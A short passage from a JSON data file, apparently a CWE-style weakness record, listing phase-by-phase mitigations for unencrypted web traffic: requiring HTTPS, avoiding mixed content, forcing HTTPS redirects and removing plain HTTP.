      "::PHASE:Architecture and Design:DESCRIPTION:Explicitly require HTTPS or another mechanism that ensures that communication is encrypted [REF-1464].::PHASE:Implementation:DESCRIPTION:Avoid using mixed content, i.e., serving a web page over HTTPS in which the page includes elements that use http: URLs [REF-1466] [REF-1467]. This is often done for images or other resources that do not seem to have privacy or security implications.::PHASE:Implementation Operation:DESCRIPTION:Perform HTTPS forcing, that is, redirecting HTTP requests to HTTPS.::PHASE:Operation:DESCRIPTION:If the product supports multiple protocols, ensure that encrypted protocols (such as HTTPS) are required, and remove any unencrypted protocols (such as HTTP).::"
    ]
  ]
}